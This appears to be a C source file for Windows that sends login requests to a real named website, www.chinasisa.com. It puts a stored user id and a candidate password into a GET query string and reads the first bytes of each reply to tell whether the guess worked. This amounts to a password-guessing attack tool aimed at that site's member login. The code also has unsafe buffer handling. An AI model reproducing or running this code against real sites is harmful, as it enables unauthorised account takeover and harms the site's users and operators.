#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "common.h"
#include "httpModule.h"
#include "logfileModule.h"

char g_id[MAX_ID];

BOOL IsRight(PCHAR key)
{
	if('s'==key[1]) return FALSE;
	else if('m'==key[1]) return TRUE;
	else return EXCEPT_ERROR;
}

INT HTTPDown(PCHAR host, PCHAR request)
{
	HINTERNET hInternet, hHttp;
	HINTERNET hReq;
//	HANDLE hFile;
	DWORD Size;
	DWORD dwRead;	//,dwWritten,Recv=0;
	char buf[MAX_PACKET_BUFFER] = {'\0'};
//	MSG Message;
	char writeBufferStr[LOGGING_BUFFER];

	// 인터넷 연결
	hInternet=InternetOpen("naverAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL) {	// InternetOpen fails
		return CONNECT_ERROR;
	}

	hHttp = InternetConnect(hInternet,host,INTERNET_DEFAULT_HTTP_PORT,"","",INTERNET_SERVICE_HTTP,0,0);
	if (hHttp==NULL) return CONNECT_ERROR;

	int returnValueIsSuccess;

	hReq = HttpOpenRequest(hHttp,"GET",request,NULL,NULL,NULL,0,0);
	HttpSendRequest(hReq,NULL,0,NULL,0);

	do {
		InternetQueryDataAvailable(hReq,&Size,0,0);
//		InternetReadFile(hReq,buf,Size,&dwRead);
		InternetReadFile(hReq,buf,2,&dwRead);
		buf[dwRead]='\0';

		returnValueIsSuccess = IsRight(buf);	// 첫번째 체크하고 바로 빠져나감
		if(EXCEPT_ERROR == returnValueIsSuccess) {
			printf("### content ###\n%s", buf);
			wsprintf(writeBufferStr,"[http Module]\r\n%s", buf);
			InternetReadFile(hReq,buf,Size - 2,&dwRead);
			buf[dwRead]='\0';
			printf("%s\n###\t###\n",buf);
			wsprintf(writeBufferStr,"%s%s\r\n", writeBufferStr,buf);			
			writeLog(writeBufferStr);
		}
		break;

	} while (dwRead != 0);

	InternetCloseHandle(hHttp);
	InternetCloseHandle(hInternet);
	hHttp=NULL;
	hInternet=NULL;

	return returnValueIsSuccess;
}

int requestPassword(char *candyPwd)
{
	char url[MAX_URL]="/member/EXC_member_login2.asp?targetURL=/comu/comu_data_view.asp?csn=292%26bsn=2254%26sn=14433&userid=";
	strcat_s(url,MAX_URL,g_id);				// id 붙이기
	strcat_s(url,MAX_URL,"&password=");		// 추가 파라메터
	strcat_s(url,MAX_URL,candyPwd);			// password 붙이기
//	printf("%s\n", url);
	return HTTPDown("www.chinasisa.com",url);
}